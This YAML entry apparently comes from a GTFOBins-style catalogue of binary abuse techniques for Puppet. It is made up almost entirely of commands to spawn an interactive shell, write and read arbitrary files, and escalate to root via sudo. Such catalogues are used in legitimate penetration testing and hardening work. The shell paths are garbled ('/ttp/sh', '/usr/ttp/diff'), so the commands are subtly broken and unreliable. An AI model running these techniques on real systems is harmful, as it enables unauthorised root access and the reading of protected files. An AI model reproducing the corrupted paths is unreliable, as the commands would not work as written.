---
functions:
  shell:
    - code: |
        puppet apply -e "exec { '/ttp/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
  file-write:
    - description: The file path must be absolute.
      code: |
        LFILE="/tmp/file_to_write"
        puppet apply -e "file { '$LFILE': content => 'DATA' }"
  file-read:
    - description: The read file content is corrupted by the `diff` output format. The actual `/usr/ttp/diff` command is executed.
      code: |
        LFILE=file_to_read
        puppet filebucket -l diff /dev/null $LFILE
  sudo:
    - code: |
        sudo puppet apply -e "exec { '/ttp/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
---
